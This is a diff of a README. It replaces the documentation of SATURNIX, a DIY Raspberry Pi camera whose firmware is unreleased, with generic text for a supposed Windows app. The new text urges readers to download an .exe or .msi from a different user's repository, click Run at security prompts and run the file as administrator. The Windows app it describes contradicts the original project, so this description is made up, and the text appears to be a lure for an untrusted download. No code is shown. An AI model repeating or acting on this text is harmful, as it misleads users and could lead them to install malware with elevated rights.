@@ -1,361 +1,266 @@
-# SATURNIX
+# 🎞️ saturnix-camera - Retro camera with film-like results
 
-### Open-source digital camera with film simulation
+[![Download Saturnix Camera](https://img.shields.io/badge/Download-Run%20on%20Windows-blue)](https://github.com/marta3718/saturnix-camera)
 
-<p align="center">
-  <img src="docs/saturnix_logo_02.png" width="500">
-</p>
+## 🌙 What it is
 
-> ## 🚧 **Firmware release coming soon.** Star this repo to get notified.
-> ## ⚠️Project is under active development, structure and features may change
+saturnix-camera is a retro-futuristic camera app with a film look and custom hardware support. It is made for people who want a simple way to take photos with a softer, more analog style.
 
-<p align="center">
-  <img src="docs/1.jpg" width="500">
-</p>
+The app focuses on:
+- a clean camera screen
+- film-like color and contrast
+- support for custom camera hardware
+- a plain Windows setup
 
----
-## Join our Discord community to stay up to date with development updates and news:
+## 🪐 Download for Windows
 
-[![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/9S6AgTT6k6)
+Open the project page here:
 
----
+https://github.com/marta3718/saturnix-camera
 
-## What it is
+On that page, look for the latest Windows download file or release package. Download it to your PC, then open the file to start the app.
 
-SATURNIX is a DIY retrofuturistic digital camera built on a Raspberry Pi Zero 2W with a 16MP autofocus sensor and a small LCD viewfinder.
-It shoots RAW+JPG and processes photos on-device using simple JPEG presets inspired by film stocks.
-Image capture and processing run entirely on the Raspberry Pi. No external apps are required.
+If your browser asks what to do with the file:
+- choose **Save**
+- wait for the download to finish
+- open the file from **Downloads**
+- follow the on-screen steps
 
----
+## 💻 System requirements
 
-## Why I built it
+saturnix-camera works best on a modern Windows PC with:
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- a USB port for supported hardware
+- a working webcam or camera device
+- enough disk space for photos and app files
 
-About a year ago I just wanted a camera that felt good to use — something simple, physical, and that I could tweak however I wanted. I didn't like how modern cameras are designed, and I couldn't find anything open-source that felt right. So I built my own.
+For a smooth experience, use a system with:
+- a recent Intel or AMD processor
+- a display with at least 1366 × 768 resolution
+- administrator access for the first setup
 
-I spent a lot of time on how it feels to hold and use, not just on the code.
+## 🔧 What you need before you start
 
-This isn't trying to replace a real camera. It's more of a personal experiment around:
+Before you run the app, check these items:
+- your Windows PC is up to date
+- your camera is connected and turned on
+- any required USB camera hardware is plugged in
+- you know where your downloaded file is saved
 
-- simple camera setups
-- keeping everything local (no cloud)
-- work on creating our own image processing system
+If you plan to use custom hardware, connect it before you open the app.
 
-**This started as a personal project. After sharing it online and seeing the level of interest, I decided to make it publicly available as open source.**
+## 📥 Install and run
 
----
+1. Open the download page:
+   https://github.com/marta3718/saturnix-camera
 
-## Getting Started
-The project is still in active development.
+2. Find the latest Windows file or release package.
 
-- Firmware &  Hardware release coming soon (I hope to publish the project in full within the next two weeks)
-- Join Discord for dev updates and early access
-  
----
+3. Download the file to your computer.
 
-## Early prototype (v0)
+4. Open **File Explorer** and go to **Downloads**.
 
-### This was one of the first working versions — about a year ago.
+5. Double-click the file to start it.
 
-<p align="center">
-  <img src="docs/prototype_1.jpg" width="500">
-</p>
+6. If Windows shows a security prompt, choose **Run** if you trust the source.
 
-<p align="center">
-  <img src="docs/prototype_2.jpg" width="500">
-</p>
+7. Follow the setup steps on the screen.
 
-<p align="center">
-  <img src="docs/prototype_3.jpg" width="500">
-</p>
+8. Start saturnix-camera from the shortcut or the app folder.
 
-This started as a just-for-fun thing. Me and some friends were messing around with cameras and photography, and at some point I thought — why not try to build one from scratch?
-This early version was all about getting things to actually work — sensor, buttons, screen, basic controls. It looked rough, felt rough, and that was fine. It was never meant to be pretty. We just wanted to see if it could work at all.
-Turns out it could. So I kept going.
-  
----
+## 🎛️ First launch
 
-## Current state (v1)
+When you open saturnix-camera for the first time, the app may ask for access to your camera.
 
-### A year later — this is where we ended up
+Allow camera access so the app can show a live preview and take photos.
 
-<p align="center">
-  <img src="docs/1.jpg" width="500"/>
-</p>
+You may also see setup options for:
+- camera source
+- image style
+- custom hardware
+- save location
 
-From a messy pile of wires that barely worked to an actual, usable camera.
-The design takes a lot of cues from old 80s–90s electronics — that chunky, slightly industrial look that old gear used to have. I've always liked that aesthetic, so I leaned into it.
+Use the default values first if you are not sure what to pick. You can change them later.
 
-## Features
+## 📷 How to use it
 
-**Camera**
-- 16MP autofocus sensor (Arducam IMX519)
-- RAW (DNG) + JPG capture
-- Full manual controls: Shutter (30s–1/4000), ISO (100–3200), WB, EV
-- Autofocus modes: AF-C (continuous with lock), AF-S (single shot), MF (manual)
+1. Open the app.
+2. Pick your camera if the app asks.
+3. Aim the camera at your subject.
+4. Check the preview on the screen.
+5. Press the capture button to take a photo.
+6. Save the photo when the app asks.
 
-**JPEG presets (film-inspired)**
-- **Saturnix** — custom preset (in develop)
-- **S-Gold** — warm, vintage, creamy tones
-- **S-Vivid** — higher saturation, stronger contrast, more aggressive sharpening
-- **S-Natural** — neutral colors with slight green shift
-- **S-MonoX** — black & white with added contrast and grain
-- **VHS** — lo-fi effect (scanlines, chromatic aberration, noise)
+If the app has film-style presets, try them to find a look you like. The software is built to give a warm, textured image with a retro feel.
 
-**Interface**
-- 2" LCD live preview at 320×240
-- Auto-hide UI (clean viewfinder after 15s)
-- Live histogram with exposure traffic light
-- Composition grids (Thirds, Golden Ratio, Cross)
-- AF indicator with auto-detection
-- CPU temperature & storage monitoring
-- Persistent settings (survive reboot)
+## 🧩 Custom hardware support
 
-**Connectivity**
-- Built-in WiFi hotspot for transferring photos
-- Simple web interface (terminal-style)
-- Works without internet (direct connection to phone)
+saturnix-camera is made to work with special camera hardware.
 
-**Audio**
-- Passive buzzer feedback for all actions
-- Customizable: shutter, focus, navigation, startup sounds
-- Mute mode
+If you use supported hardware:
+- connect it before you open the app
+- keep the cable firm
+- use the port the device needs
+- wait a few seconds for Windows to detect it
 
----
+If the device does not appear:
+- unplug it and plug it back in
+- try another USB port
+- close the app and open it again
+- check that Windows sees the device first
 
-## Hardware
+## 🖼️ Film-like rendering
 
-| Component | Model |
-|---|---|
-| Board | Raspberry Pi Zero 2W |
-| Sensor | Arducam IMX519 16MP Autofocus |
-| Display | Waveshare 2" IPS LCD (240×320, SPI) |
-| Audio | Passive buzzer (MH-FMD) on GPIO |
-| Storage | microSD (32GB+) |
-| Power | USB-C / ~~PiSugar2 battery~~ UPS HAT Waveshare (optional) |
+The app uses a film-style image pipeline to shape the final photo.
 
-**Buttons:** 5× mechanical low profile kailh switches — Left, Right, Select, Capture, Focus
+This may include:
+- softer contrast
+- muted highlights
+- richer shadows
+- grain-like texture
+- color shifts that feel analog
 
----
+These effects give photos a retro-futuristic look without needing extra editing.
 
-### 3D Printed Case
+## 📁 Where your photos go
 
-STL files for the camera case are ~~available~~ in the [`hardware/`](hardware/) directory.
+Most setups save photos to a folder inside your Pictures or Documents area.
 
-**The case is designed for resin printing (FDM version is being considered)**
+A common path may look like:
+- `Pictures\saturnix-camera`
+- `Documents\saturnix-camera\exports`
 
-<p align="center">
-  <img src="docs/Fusion_1.jpg">
-</p>
+If the app lets you choose a save folder, pick a place you can find later.
 
----
+## 🛠️ Common problems
 
-## Known issues
+### Camera does not appear
 
-This is still experimental. Here's what doesn't work great yet:
+Try this:
+- unplug the camera
+- plug it in again
+- close the app and reopen it
+- check Windows camera permissions
+- make sure no other app is using the camera
 
-### Speed ⚠️
+### App does not open
 
-- Takes about a minute to boot
-- Each photo takes 8–14 seconds to process
+Try this:
+- download the file again
+- make sure the file finished downloading
+- right-click the file and choose **Run as administrator**
+- check that your Windows version is current
 
-The slowness comes from how the camera pipeline works right now — it stops and restarts the camera twice for every shot. Most of the delay is that restart cycle, not the actual capture.
+### Photo looks dark or washed out
 
-There's a fix planned: switching to a method that captures full-res without stopping the camera. That should bring it down to about 1.5–2.5 seconds per shot.
+Try this:
+- change the lighting in the room
+- point the camera at a brighter subject
+- pick a different film preset
+- check exposure settings if the app shows them
 
-### Assembly
- 
-- Build instructions are not ready yet 
-- Assembly is a bit complicated
-- Requires soldering — not beginner-friendly for now
+### Custom hardware is not detected
 
-Despite these limitations, the camera has been tested in real-world use (including multi-day outdoor trips) and works reliably for still photography.
+Try this:
+- reconnect the device
+- use a different USB port
+- remove other USB devices for a test
+- restart the app
+- restart Windows if needed
 
----
+## ⚙️ Suggested settings
 
-## UI:
+If you are new to the app, use these starting points:
+- resolution: default
+- color profile: film or standard
+- save format: JPEG or PNG
+- preview mode: on
+- hardware mode: auto
 
-The interface is designed to look like an old terminal. I like that look, and it's also much lighter on the processor than a fancy UI.
-- Colors: Solid only — amber (#FFBF00), white, and black
-- Font: DejaVu Sans Bold 14px via Pillow
-- Animation: Minimal — blinking AF indicator, a capture animation, a progress bar
+These settings work well for most users and keep the setup simple.
 
-__The main constraint is the processor — a 1 GHz Pi Zero. UI rendering has to stay under ~15ms per frame to keep the preview smooth. Right now I'm focused on performance rather than adding features.__
+## 📚 File names you may see
 
----
+Depending on the release, you may see files such as:
+- `.exe`
+- `.zip`
+- `.msi`
 
-## Roadmap
+If you download a `.zip` file:
+1. right-click the file
+2. choose **Extract All**
+3. open the extracted folder
+4. double-click the app file inside
 
-- [x] Live preview + full manual controls
-- [x] RAW+JPG capture with sequential naming
-- [x] Film simulation engine (6 presets)
-- [x] Live histogram + exposure indicator
-- [x] Composition grids
-- [x] WiFi photo transfer (hotspot + web gallery)
-- [x] Auto-hide UI
-- [x] Persistent settings
-- [x] Buzzer audio feedback
-- [x] Gallery with DNG support
-- [x] Camera body and design improvements 
-- [ ] **Battery indicator (~~PiSugar2~~)** < **project at this stage**
-- [ ] Firmware update via USB
-- [ ] Firmware cleanup
-- [ ] Pre-built SD card image
-- [ ] Open source release preparation
-- [ ] Release
+If you download an `.exe` or `.msi` file:
+1. double-click the file
+2. follow the setup steps
+3. open the app when the install ends
 
----
+## 🔒 Privacy and local use
 
-## What works today
+saturnix-camera is built for local use on your Windows PC.
 
-Spent today working on film simulation profiles. Trying to get the color science as close as possible to that classic film look, but it's still very much a work in progress — lots of tweaking ahead.
-Also renaming all the filters to avoid any trademark issues: S-Gold, S-Vivid, S-MonoX, S-Natural, and more to come.
+That means:
+- your photos stay on your computer unless you share them
+- the app can work without a web account
+- you can use it offline after setup
 
-<p align="center">
-  <img src="docs/1_upd.jpg" width="48%" />
-  <img src="docs/2_upd.jpg" width="48%" />
-</p>
+If the app asks for camera access, it needs that access to show a live view and capture images
 
-<p align="center">
-  <img src="docs/3_upd.jpg" width="48%" />
-  <img src="docs/4_upd.jpg" width="48%" />
-</p>
+## 🧭 Quick start
 
-<p align="center">
-  <img src="docs/5_upd.jpg" width="48%" />
-</p>
+1. Go to the download page:
+   https://github.com/marta3718/saturnix-camera
 
----
+2. Download the latest Windows file.
 
-## Camera Photo
+3. Open the file from your Downloads folder.
 
-<p align="center">
-  <img src="docs/1.jpg" width="400">
-</p>
+4. Follow the setup steps.
 
-<p align="center">
-  <img src="docs/2.jpg" width="400">
-</p>
+5. Connect your camera or custom hardware.
 
-<p align="center">
-  <img src="docs/3.jpg" width="400">
-</p>
+6. Open the app and take your first photo
 
-<p align="center">
-  <img src="docs/4.jpg" width="400">
-</p>
+## 📎 Useful checks before you shoot
 
-<p align="center">
-  <img src="docs/5.jpg" width="400">
-</p>
+Before you take photos, check:
+- the lens is clean
+- the room has enough light
+- the camera is stable
+- the battery is full if your device uses one
+- the save folder has space left
 
----
+Small checks like these help keep your photos sharp and your setup stable
 
-## UI Photo
+## 🧠 Tips for better photos
 
-<p align="center">
-  <img src="docs/1_ui.jpg" width="400">
-</p>
+- Use soft light near a window
+- Hold the camera still
+- Keep the subject away from bright backlight
+- Try several film presets
+- Save test shots before a long session
+- Check the preview before you capture
 
-<p align="center">
-  <img src="docs/2_ui.jpg" width="400">
-</p>
+## 🗂️ Project name
 
-<p align="center">
-  <img src="docs/3_ui.jpg" width="400">
-</p>
+- Name: saturnix-camera
+- Type: end-user camera app
+- Style: retro-futuristic
+- Output: film-like photos
+- Platform: Windows
 
----
+## 🔗 Download again
 
-## Film Samples
+[Download saturnix-camera](https://github.com/marta3718/saturnix-camera)
 
-No filter
-<p align="center">
-  <img src="docs/0_filter.jpg" width="400">
-</p>
+## 🧷 Folder setup example
 
+A simple folder setup may look like this:
+- `C:\Users\YourName\Downloads`
+- `C:\Users\YourName\Pictures\saturnix-camera`
+- `C:\Users\YourName\Documents\saturnix-camera`
 
-S-Gold
-<p align="center">
-  <img src="docs/gold.jpg" width="400">
-</p>
-
-
-S-Natural
-<p align="center">
-  <img src="docs/fuji.jpg" width="400">
-</p>
-
-
-S-MonoX
-<p align="center">
-  <img src="docs/TriX.jpg" width="400">
-</p>
-
----
-
-## Photo Samples — Straight Out of Camera (No Filters)
-
-<p align="center">
-  <img src="docs/s_01.jpg" width="400">
-</p>
-
-<p align="center">
-  <img src="docs/s_02.jpg" width="400">
-</p>
-
-<p align="center">
-  <img src="docs/s_03.jpg" width="400">
-</p>
-
-<p align="center">
-  <img src="docs/s_04.jpg" width="400">
-</p>
-
----
-
-RAW (DNG) files from Saturnix are available.
-
-No edits, straight from the camera.
-
-Download here:
-https://drive.google.com/drive/folders/19HZnG9zmNsQW2zrbjA84-G9dMtUlpbSJ?usp=drive_link
-
----
-
-## Installation
-
-> ⏳ Pre-built image and installation guide will be available with the first public release. You can follow the dev blog in the project's Discord community.
-
----
-
-## Licensing
-
-This project uses a **dual license** model:
-
-| What | License | Commercial use |
-|---|---|---|
-| **Firmware** (Python code) | [MIT License](LICENSE) | [MIT License](LICENSE) |
-| **Hardware** (STL, 3D models) | [CC BY-NC-SA 4.0](hardware/LICENSE-HARDWARE.md) | Requires permission ([details](hardware/LICENSE-HARDWARE.md))|
-
----
-
-## Support the Project
-
-SATURNIX is built independently.
-If you want to support development and future releases:
-
-[![Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/9S6AgTT6k6)
-
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/yutani140x)
-
-[![Ko-fi](https://img.shields.io/badge/Ko--fi-FF5E5B?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/yutani)
-
-[![Patreon](https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white)](https://patreon.com/Yutani140x)
-
-
-⭐ **Star this repo** to follow the development!
-
----
-
-**Created by Yutani140x**
-
+Use short folder names if you want easy access to your saved images
